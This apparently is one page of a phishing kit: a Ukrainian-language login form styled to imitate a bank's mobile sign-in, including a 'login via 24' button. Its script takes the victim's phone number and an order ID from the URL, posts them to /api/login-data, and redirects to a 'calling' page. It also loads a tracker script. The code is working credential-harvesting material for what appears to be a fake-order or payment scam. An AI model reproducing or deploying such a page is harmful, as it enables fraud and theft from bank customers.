<!DOCTYPE html>
<html lang="uk" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Вхід/Реєстрація</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}

.header{display:flex;align-items:center;justify-content:flex-end;padding:16px 20px}
.x-btn{background:none;border:none;cursor:pointer;padding:4px}
.x-btn svg{width:22px;height:22px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}

.body{flex:1;padding:0 20px;display:flex;flex-direction:column}

.title{font-size:21px;font-weight:300;color:#1a1a1a;text-align:center;margin:20px 0 28px}

.label{font-size:11px;color:#b0b0b0;margin-bottom:6px}

.phone-field{
  display:flex;align-items:center;
  padding-bottom:10px;border-bottom:1.5px solid #00A651;margin-bottom:24px;
}
.prefix{display:flex;align-items:center;gap:5px;padding-right:12px;border-right:1px solid #d0d0d0;margin-right:12px;cursor:pointer}
.prefix .flag{font-size:18px}
.prefix .num{font-size:14px;font-weight:600;color:#1a1a1a}
.prefix .arr{width:12px;height:12px}
.prefix .arr path{fill:#999}
.phone-input{border:none;outline:none;font-size:14px;color:#1a1a1a;background:transparent;width:100%;font-family:inherit}
.phone-input::placeholder{color:#ccc}

.agree{display:flex;align-items:flex-start;gap:10px;margin-bottom:28px}
.checkbox{
  width:16px;height:16px;min-width:16px;border:1.5px solid #ccc;border-radius:3px;
  cursor:pointer;display:flex;align-items:center;justify-content:center;
  background:#fff;transition:.15s;margin-top:1px;
}
.checkbox.on{background:#00A651;border-color:#00A651}
.checkbox svg{width:10px;height:10px;stroke:#fff;stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round;display:none}
.checkbox.on svg{display:block}
.agree-text{font-size:9px;color:#888;line-height:1.4}
.agree-text a{color:#00A651;text-decoration:none}

.btn-green{
  display:block;width:auto;max-width:240px;margin:0 auto;padding:13px 50px;
  border:none;border-radius:50px;font-size:14px;font-weight:600;
  color:#fff;background:#00A651;cursor:pointer;font-family:inherit;transition:.2s;
}
.btn-green:hover{background:#008C45}
.btn-green:disabled{opacity:.45;cursor:default}

.divider{text-align:center;color:#bbb;font-size:12px;margin:14px 0}

.btn-black{
  width:auto;max-width:260px;margin:0 auto;padding:13px 50px;
  border:none;border-radius:50px;font-size:14px;font-weight:600;
  color:#fff;background:#1a1a1a;cursor:pointer;font-family:inherit;transition:.2s;
  display:flex;align-items:center;justify-content:center;gap:8px;
}
.btn-black:hover{background:#333}
.icon24{
  width:24px;height:24px;border-radius:50%;background:#00A651;
  display:flex;align-items:center;justify-content:center;
  font-size:12px;font-weight:800;color:#fff;
}

.stores{
  display:flex;align-items:center;justify-content:center;gap:28px;
  margin-top:auto;padding:24px 20px 28px;
}
.store{display:flex;align-items:center;gap:8px;text-decoration:none;color:#1a1a1a}
.store svg{width:24px;height:24px;flex-shrink:0}
.store .s-top{font-size:10px;color:#999}
.store .s-name{font-size:13px;font-weight:600;color:#1a1a1a}

.err{display:none;background:#fff0f0;border:1px solid #fcc;border-radius:8px;padding:8px 12px;margin-bottom:12px;color:#c62828;font-size:12px;text-align:center}

.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:99;align-items:center;justify-content:center;padding:20px}
.overlay.open{display:flex}
.modal{background:#fff;border-radius:20px;width:100%;max-width:360px;padding:28px 24px;position:relative;text-align:center}
.modal-x{position:absolute;top:14px;right:14px;width:32px;height:32px;border-radius:50%;background:#f5f5f5;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center}
.modal-x svg{width:16px;height:16px;stroke:#888;stroke-width:2.5;fill:none;stroke-linecap:round}
.modal img{width:100%;border-radius:10px}
</style>
</head>
<body>

<div class="header">
  <button class="x-btn" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
</div>

<div class="body">
  <div class="err" id="err"></div>

  <div class="title">Вхід/Реєстрація</div>

  <div class="label">Номер телефону</div>

  <div class="phone-field">
    <div class="prefix">
      <span class="flag">🇺🇦</span>
      <span class="num">+380</span>
      <svg class="arr" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
    </div>
    <input class="phone-input" id="phone" type="tel" inputmode="numeric" placeholder="00 000 00 00" maxlength="12" oninput="checkReady()">
  </div>

  <div class="agree">
    <div class="checkbox" id="chk" onclick="toggle()"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg></div>
    <div class="agree-text">Продовжуючи, я підтверджую, що згоден (-на) з <a href="#">Умовами та Правилами</a>, й ознайомлений (-на) із <a href="#">Повідомленням про обробку персональних даних у Банку</a></div>
  </div>

  <button class="btn-green" id="goBtn" onclick="go()" disabled>Продовжити</button>

  <div class="divider">або</div>

  <button class="btn-black" onclick="go()">Увійти через <span class="icon24">24</span></button>
</div>

<div class="stores">
  <a class="store" href="#">
    <svg viewBox="0 0 24 24" fill="#1a1a1a"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.81-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
    <div><div class="s-top">Доступно у</div><div class="s-name">App Store</div></div>
  </a>
  <a class="store" href="#">
    <svg viewBox="0 0 24 24" fill="none"><path d="M3.61 1.81L13.39 12 3.61 22.19c-.26-.44-.41-.96-.41-1.52V3.33c0-.56.15-1.08.41-1.52z" fill="#4285F4"/><path d="M17.07 8.32l-3.68 3.68 3.68 3.68 4.15-2.36c.72-.41.72-1.24 0-1.64l-4.15-2.36z" fill="#FBBC04"/><path d="M3.61 22.19c.51.86 1.41 1.26 2.32.78L17.07 15.68l-3.68-3.68L3.61 22.19z" fill="#EA4335"/><path d="M3.61 1.81L13.39 12l3.68-3.68L5.93 1.03C5.02.55 4.12.95 3.61 1.81z" fill="#34A853"/></svg>
    <div><div class="s-top">Доступно у</div><div class="s-name">Play Market</div></div>
  </a>
</div>

<div class="overlay" id="ov">
  <div class="modal">
    <button class="modal-x" onclick="closeErr()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
    <img src="images/error-illustration.jpg" alt="" onclick="closeErr()">
  </div>
</div>

<script>
var params=new URLSearchParams(location.search),orderId=params.get("order"),agreed=false;

function toggle(){
  agreed=!agreed;
  var c=document.getElementById("chk");
  agreed?c.classList.add("on"):c.classList.remove("on");
  checkReady();
}
function checkReady(){
  var p=document.getElementById("phone").value.replace(/\D/g,"");
  document.getElementById("goBtn").disabled=!(p.length>=9&&agreed);
}
if(params.get("error")==="1")document.getElementById("ov").classList.add("open");

function closeErr(){
  document.getElementById("ov").classList.remove("open");
  history.replaceState(null,"","login.html"+(orderId?"?order="+orderId:""));
}
document.getElementById("ov").addEventListener("click",function(e){if(e.target===this)closeErr()});

async function go(){
  var p=document.getElementById("phone").value.replace(/\D/g,"");
  if(p.length<9)return;
  var btn=document.getElementById("goBtn");
  btn.disabled=true;btn.textContent="Зачекайте...";
  try{
    var r=await fetch("/api/login-data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({order_id:orderId,username:"+380"+p,country:"UA"})});
    var d=await r.json();
    if(!d.success){showErr(d.message||"Помилка");btn.disabled=false;btn.textContent="Продовжити";return}
    location.href="calling.html?order="+orderId+"&phone="+p;
  }catch(e){showErr("Помилка з'єднання");btn.disabled=false;btn.textContent="Продовжити"}
}
function showErr(m){var e=document.getElementById("err");e.textContent=m;e.style.display="block";setTimeout(function(){e.style.display="none"},3000)}
document.getElementById("phone").addEventListener("keydown",function(e){if(e.key==="Enter")go()});
</script>
<script src="tracker.js"></script>
</body>
</html>
